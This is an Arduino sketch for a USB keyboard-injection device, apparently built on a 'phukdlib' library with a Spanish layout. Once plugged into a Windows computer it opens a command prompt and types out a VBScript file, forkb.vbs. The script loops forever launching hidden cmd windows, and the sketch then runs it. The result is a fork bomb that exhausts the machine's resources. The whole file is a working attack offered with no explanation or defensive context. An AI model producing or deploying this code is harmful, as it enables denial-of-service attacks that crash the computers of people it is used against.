#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("cmd");
  delay(3000);
  Keyboard.println("copy con forkb.vbs");
  delay(2000);
  Keyboard.println("do");
  delay(2000);
  Keyboard.println("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False");
  delay(2000);
  Keyboard.println("loop");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("start forkb.vbs && exit");
  while(1);
}
